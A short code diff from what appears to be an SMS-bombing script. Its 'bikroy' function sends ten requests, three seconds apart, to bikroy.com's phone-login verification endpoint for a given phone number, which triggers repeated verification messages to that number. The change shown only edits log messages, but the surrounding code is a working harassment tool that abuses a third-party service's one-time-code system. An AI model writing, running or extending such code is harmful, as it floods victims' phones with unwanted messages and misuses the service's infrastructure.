@@ -7,9 +7,9 @@ async function bikroy(number, limit) {
     for (let i = 0; i < 10; i++) {
       try {
       const response = await axios.get(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${number}`);
-        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
+        console.log(`[${i + 1}/10] bikroy Sent to ${number} | Response:`, response.data);
       } catch (error) {
-        console.error(`[${i + 1}/10] Failed:`, error.message);
+        console.error(`[${i + 1}/10] bikroy Failed:`, error.message);
       }
 
       await new Promise(resolve => setTimeout(resolve, 3000));
